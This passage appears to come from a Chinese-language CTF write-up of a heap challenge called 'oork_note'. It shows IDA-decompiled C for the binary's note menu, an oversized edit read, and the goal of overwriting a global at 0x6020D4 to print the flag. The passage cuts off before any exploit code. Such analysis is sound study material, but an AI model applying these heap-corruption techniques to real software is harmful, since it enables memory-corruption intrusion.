3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unsorted_chunks (av)-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bck-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;测试题目-oork-note&#34;&gt;&lt;a href=&#34;#测试题目-oork-note&#34; class=&#34;headerlink&#34; title=&#34;测试题目 oork_note&#34;&gt;&lt;/a&gt;测试题目 oork_note&lt;/h1&gt;&lt;p&gt;​		一看就是一道堆题,给出了一个菜单.然后会让你输入7次,也就是一周的日记,要输入长度和内容,这里没有问题,&lt;font color=&#34;red&#34;&gt;注意一个细节,就是你输入的长度会有个操作 v2 +&amp;#x3D; 144;  也就是增大了0x90,这个后面会用到&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		然后就是编辑和删除操作了,&lt;/p&gt;
&lt;p&gt;​		拿flag其实很明显,就是要把0x6020D4的值修改为一个比167大的值就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_4008F6();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to 997 wellfare! This program records your weekly workloads.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v4 &amp;lt;= &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Day %d in this weekend.\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)(v4 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 += sub_400939(v4++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do you need to edit your note? y/n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( getchar() == &lt;span class=&#34;number&#34;&gt;121&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sub_400B62();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( dword_6020D4 &amp;gt; &lt;span class=&#34;number&#34;&gt;167&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system(&lt;span class=&#34;string&#34;&gt;&amp;quot;cat ./flag&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;You are fired, Bye.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;sub_400939&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\tInput the length of your work note:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 += &lt;span class=&#34;number&#34;&gt;144&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\tInput context of your work record:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(&amp;amp;ptr + a1) = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)((v2 &amp;amp; (rand() + &lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;)) % &lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		下面看一下编辑和删除,删除的话,把指针也赋0了,所以没有double free的问题,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_400B62&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Input your choice: \n\t1.edit note\n\t2.delete note\n\t0.exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sub_400A14();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sub_400AEE();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v1 );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_400A14&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v0; &lt;span class=&#34;comment&#34;&gt;// ebx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-1Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;input the note index to edit:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 &amp;lt;= &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Input the content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2), &lt;span class=&#34;number&#34;&gt;0x4F0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0 = v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(&amp;amp;ptr + v0) = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x3A0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *(&amp;amp;ptr + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2), &lt;span class=&#34;number&#34;&gt;0x3A0&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_400AEE&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;input the note index to delete:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(*(&amp;amp;ptr + v1));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(&amp;amp;ptr + v1) = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; 